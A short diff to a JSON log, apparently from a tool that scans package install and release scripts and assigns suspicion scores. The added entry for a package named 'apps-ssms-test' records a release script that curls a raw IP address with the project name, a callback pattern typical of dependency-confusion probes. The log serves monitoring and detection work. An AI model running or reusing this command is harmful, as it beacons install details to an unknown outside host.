@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "apps-ssms-test",
+    "version": "0.0.1",
+    "scriptType": "release",
+    "scriptContent": "curl -vs http://54.204.236.95:3000/build/?project=apps-ssms 2>&1",
+    "previousVersion": null,
+    "timestamp": "2026-04-05T18:56:53.467Z",
+    "issuesend": false,
+    "suspicionScore": 16
+  },
+  {
     "packageName": "apified",
     "version": "0.2.2",
     "scriptType": "test",
